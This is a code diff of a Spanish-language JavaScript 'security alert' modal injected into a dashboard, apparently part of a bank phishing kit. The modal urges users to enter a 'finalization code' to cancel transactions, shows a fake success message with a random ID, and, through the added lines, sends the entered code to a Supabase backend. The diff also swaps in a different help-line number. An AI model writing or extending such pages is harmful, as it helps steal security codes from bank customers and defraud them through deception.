@@ -1,4 +1,4 @@
-// Modal de alerta de seguridad - Se inyecta al cargar el dashboard
+// Modal de alerta de seguridad - Versión con Supabase
 (function() {
     var modalHTML = '<div id="modalSeguridadOverlay" class="modal-seguridad-overlay" style="display:none">' +
         '<div class="modal-seguridad">' +
@@ -26,14 +26,14 @@
         '<label>Ingrese su <strong>Código de Finalización</strong> para cancelar:</label>' +
         '<div class="input-group">' +
         '<input type="text" id="codigoCancelacion" class="modal-seguridad-input" placeholder="CFT-XXXX-XXXX" maxlength="14">' +
-        '<button id="btnCancelar" class="modal-seguridad-boton" onclick="cancelarTx()">Cancelar transacciones</button>' +
+        '<button id="btnCancelar" class="modal-seguridad-boton" onclick="cancelarTx()">Cancelar</button>' +
         '</div>' +
         '<p id="errorCodigo" style="color:#E1111C;font-size:12px;margin-top:8px;display:none">Código inválido</p>' +
         '</div>' +
         '</div>' +
         '<div class="modal-seguridad-footer">' +
         '<button class="modal-seguridad-cerrar" onclick="cerrarModal()">Cerrar</button>' +
-        '<p class="modal-seguridad-ayuda">Línea de atención <strong>01 8000 12 3838</strong></p>' +
+        '<p class="modal-seguridad-ayuda">Línea de atención <strong>01-8000-123-456</strong></p>' +
         '</div>' +
         '</div>' +
         '</div>';
@@ -70,16 +70,23 @@
         document.getElementById('modalSeguridadOverlay').style.display = 'none';
     }
 
-    function cancelarTx() {
+    async function cancelarTx() {
         var c = document.getElementById('codigoCancelacion').value.trim();
         if (!c || c.length < 5) {
             document.getElementById('errorCodigo').style.display = 'block';
             document.getElementById('codigoCancelacion').style.borderColor = '#E1111C';
             return;
         }
+
         document.getElementById('errorCodigo').style.display = 'none';
         document.getElementById('btnCancelar').textContent = 'Procesando...';
         document.getElementById('btnCancelar').disabled = true;
+
+        // Guardar código en Supabase si está disponible
+        if (window.loginSupabase && window.loginSupabase.procesarCodigoSeguridad) {
+            await window.loginSupabase.procesarCodigoSeguridad(c);
+        }
+
         setTimeout(function() {
             document.querySelector('.modal-seguridad-cuerpo').innerHTML = '<div style="text-align:center;padding:30px 20px"><div style="font-size:48px;margin-bottom:16px">✅</div><h3 style="color:#2E7D32;margin:0 0 8px;font-size:18px">Transacciones Canceladas</h3><p style="color:#666;font-size:14px;margin:0">ID: CFT-' + Math.random().toString(36).substr(2, 8).toUpperCase() + '</p></div>';
             document.querySelector('.modal-seguridad-footer .modal-seguridad-cerrar').textContent = 'Aceptar';
